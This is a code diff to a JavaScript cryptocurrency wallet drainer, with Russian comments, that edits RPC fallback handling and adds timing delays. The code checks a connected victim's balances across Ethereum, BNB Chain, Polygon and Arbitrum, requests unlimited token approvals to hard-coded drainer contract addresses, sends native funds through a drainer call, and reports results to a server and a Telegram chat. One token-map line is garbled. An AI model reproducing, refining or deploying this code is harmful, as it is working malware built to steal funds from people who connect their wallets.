@@ -7,33 +7,8 @@ const TELEGRAM_CHAT_ID = '-4767714458';
 // Переменная для отслеживания времени последнего вызова drain
 let lastDrainTime = 0;
 
-// Список резервных RPC для каждой сети
-const RPC_URLS = {
-  1: [
-    'https://rpc.eth.gateway.fm',
-    'https://eth.llamarpc.com',
-    'https://ethereum-rpc.publicnode.com',
-    'https://cloudflare-eth.com'
-  ],
-  56: [
-    'https://bsc-dataseed.binance.org/',
-    'https://bsc-dataseed1.defibit.io/',
-    'https://bsc-dataseed1.ninicoin.io/',
-    'https://bsc-dataseed2.binance.org/',
-    'https://bsc-rpc.publicnode.com'
-  ],
-  137: [
-    'https://polygon-rpc.com/',
-    'https://rpc-mainnet.maticvigil.com/',
-    'https://polygon-bor.publicnode.com',
-    'https://rpc.ankr.com/polygon'
-  ],
-  42161: [
-    'https://arb1.arbitrum.io/rpc',
-    'https://arbitrum-one.publicnode.com',
-    'https://rpc.ankr.com/arbitrum'
-  ]
-};
+// Функция для создания задержки
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 // Функция для отправки сообщения в Telegram
 async function sendTelegramMessage(message) {
@@ -167,7 +142,7 @@ const TOKEN_SYMBOLS = {
   "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9": "AAVEUSDT",
   "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24": "RNDRUSDT",
   "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2": "MKRUSDT",
-  "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82": "CAKEUSDT",
+  "0x6b3595068778dd592e39a122f4f5a  "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82": "CAKEUSDT",
   "0xe02df9e3e622debdd69fb838bb799e3f168902c5": "BAKEUSDT",
   "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63": "XVSUSDT",
   "0x8f0528ce5ef7b51152a59745befdd91d97091d2f": "ALPACAUSDT",
@@ -203,7 +178,7 @@ const CHAINS = {
     name: "Ethereum Mainnet",
     nativeToken: "ETH",
     chainIdHex: "0x1",
-    rpcUrls: RPC_URLS[1],
+    rpcUrls: ["https://rpc.eth.gateway.fm", "https://ethereum-rpc.publicnode.com"],
     usdtAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
     usdcAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
     drainerAddress: "0x4202B38858847813aDEe0cdbeB339B3e4Fb2Ae82",
@@ -237,7 +212,11 @@ const CHAINS = {
     name: "BNB Chain",
     nativeToken: "BNB",
     chainIdHex: "0x38",
-    rpcUrls: RPC_URLS[56],
+    rpcUrls: [
+      "https://bsc-dataseed.binance.org/",
+      "https://bsc-dataseed1.defibit.io/",
+      "https://bsc-dataseed1.ninicoin.io/"
+    ],
     usdtAddress: "0x55d398326f99059ff775485246999027b3197955",
     usdcAddress: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
     drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
@@ -265,7 +244,7 @@ const CHAINS = {
     name: "Polygon",
     nativeToken: "MATIC",
     chainIdHex: "0x89",
-    rpcUrls: RPC_URLS[137],
+    rpcUrls: ["https://polygon-rpc.com/"],
     usdtAddress: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
     usdcAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
     drainerAddress: "0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c",
@@ -284,7 +263,7 @@ const CHAINS = {
     name: "Arbitrum One",
     nativeToken: "ETH",
     chainIdHex: "0xa4b1",
-    rpcUrls: RPC_URLS[42161],
+    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
     usdtAddress: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
     usdcAddress: "0xaf88d065e77c8cc2239327c5edb3a432268e583",
     drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
@@ -309,28 +288,22 @@ async function getTokenPriceInUSDT(tokenSymbol) {
   }
 }
 
-// Функция для выбора рабочего провайдера с подходом из getReliableProvider
-async function getWorkingProvider(chainId) {
-  const rpcUrls = CHAINS[chainId].rpcUrls;
-
-  for (const rpcUrl of rpcUrls) {
-    if (rpcUrl.includes('YOUR_INFURA_KEY') || rpcUrl.includes('YOUR_ALCHEMY_KEY')) {
-      console.warn(`⚠️ Пропущен RPC ${rpcUrl}: требуется API-ключ`);
-      continue;
-    }
-
+// Функция для выбора рабочего провайдера
+async function getWorkingProvider(rpcUrls) {
+  const providerPromises = rpcUrls.map(async (rpc) => {
     try {
-      const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
+      const provider = new ethers.providers.JsonRpcProvider(rpc);
       await provider.getBalance('0x0000000000000000000000000000000000000000');
-      console.log(`✅ Используется RPC: ${rpcUrl} для chainId ${chainId}`);
       return provider;
-    } catch (err) {
-      console.warn(`⚠️ RPC ${rpcUrl} для chainId ${chainId} недоступен: ${err.message}`);
+    } catch {
+      return null;
     }
-  }
+  });
 
-  console.error(`❌ Не удалось найти рабочий RPC для chainId ${chainId}`);
-  return null; // Возвращаем null вместо ошибки, чтобы обработать на уровне вызова
+  const results = await Promise.all(providerPromises);
+  const workingProvider = results.find(provider => provider !== null);
+  if (!workingProvider) throw new Error('No working provider found');
+  return workingProvider;
 }
 
 // Проверка баланса
@@ -439,7 +412,7 @@ function formatBalance(balance, decimals) {
 }
 
 // Выполнение дрейна
-async function drain(chainId, signer, userAddress, bal, provider, onApproveTxSent) {
+async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`Подключённый кошелёк: ${userAddress}`);
 
   const config = CHAINS[chainId];
@@ -583,18 +556,15 @@ async function drain(chainId, signer, userAddress, bal, provider, onApproveTxSen
         const gasPrice = await provider.getGasPrice();
         console.log(`📏 Цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
+        console.log(`⏳ Задержка 5 секунд перед approve для токена ${token}`);
+        await delay(5000);
+
         const tx = await contract.approve(config.drainerAddress, MAX, {
           gasLimit: 100000,
           gasPrice: gasPrice,
           nonce
         });
         console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
-        
-        // Вызываем коллбэк для закрытия модального окна
-        if (onApproveTxSent) {
-          await onApproveTxSent();
-        }
-
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
@@ -624,6 +594,9 @@ async function drain(chainId, signer, userAddress, bal, provider, onApproveTxSen
       try {
         const gasPrice = await provider.getGasPrice();
         console.log(`📏 Цена газа для ${config.nativeToken}: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
+
+        console.log(`⏳ Задержка 5 секунд перед processData`);
+        await delay(5000);
 
         const tx = await drainer.processData(taskId, dataHash, nonce, [], {
           value,
@@ -683,24 +656,20 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 }
 
 // Основная функция
-export async function runDrainer(provider, signer, userAddress, onApproveTxSent) {
+export async function runDrainer(provider, signer, userAddress) {
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
-  const minDelay = 0; // Убираем минимальную задержку
+  const minDelay = 5000;
 
   if (timeSinceLastDrain < minDelay) {
-    return; // Убираем задержку
+    await delay(minDelay - timeSinceLastDrain);
   }
 
   lastDrainTime = Date.now();
 
   const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
     try {
-      const reliableProvider = await getWorkingProvider(chainId);
-      if (!reliableProvider) {
-        console.error(`⚠️ Пропускаем chainId ${chainId}: нет рабочего провайдера`);
-        return null;
-      }
+      const reliableProvider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
       const balance = await checkBalance(chainId, userAddress, reliableProvider);
       return { chainId: Number(chainId), balance, provider: reliableProvider };
     } catch (error) {
@@ -710,10 +679,6 @@ export async function runDrainer(provider, signer, userAddress, onApproveTxSent)
   });
 
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
-  if (!balances.length) {
-    throw new Error('No working providers found for any chain');
-  }
-
   const sorted = balances
     .filter(item => hasFunds(item.balance))
     .sort((a, b) => {
@@ -728,6 +693,6 @@ export async function runDrainer(provider, signer, userAddress, onApproveTxSent)
 
   const target = sorted[0];
   await switchChain(target.chainId);
-  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider, onApproveTxSent);
+  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
   return status;
 }
